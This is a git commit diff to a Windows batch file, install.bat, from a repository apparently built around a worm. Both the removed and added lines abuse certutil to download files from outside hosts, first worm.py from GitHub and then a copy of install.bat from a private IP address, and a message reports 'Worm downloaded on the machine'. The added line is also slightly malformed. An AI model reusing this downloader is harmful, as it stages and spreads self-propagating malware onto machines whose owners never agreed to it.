c939b5da68c70e298aad5f078426145d48b51a30
t_hat <68925158+sonupreetam@users.noreply.github.com>
2021-12-06 22:41:52 +0100

    Add files via upload

--- install.bat
+++ install.bat
@@ -1,6 +1,6 @@
 @echo off
 setlocal enableextensions
-certutil.exe -urlcache -split -f https://raw.githubusercontent.com/sonupreetam/worm/main/worm.py worm.py
+certutil certutil.exe -urlcache -split -f http://192.168.22.147:8080/install.bat install.bat
 if %errorlevel% NEQ 0 (
 echo.
 echo Worm downloaded on the machine
